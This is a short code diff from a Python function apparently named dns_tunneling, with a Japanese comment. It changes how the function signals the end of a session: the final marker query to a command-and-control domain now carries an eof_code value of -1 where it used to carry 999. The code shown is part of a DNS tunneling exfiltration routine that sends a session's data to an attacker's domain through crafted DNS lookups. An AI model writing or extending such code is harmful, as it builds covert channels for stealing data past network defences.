@@ -63,7 +63,8 @@ def dns_tunneling(original_bytes: bytes, c2_domain: str):
             pass
 
     # 5. 最後にEOFを送信して終了を通知
-    eof_fqdn = f"{session_id}.999.656f66.{c2_domain}"
+    eof_code = -1
+    eof_fqdn = f"{session_id}.{eof_code}.656f66.{c2_domain}"
     print(f"Sending EOF: {eof_fqdn}")
     try:
         resolver.resolve(eof_fqdn, "A", lifetime=1)
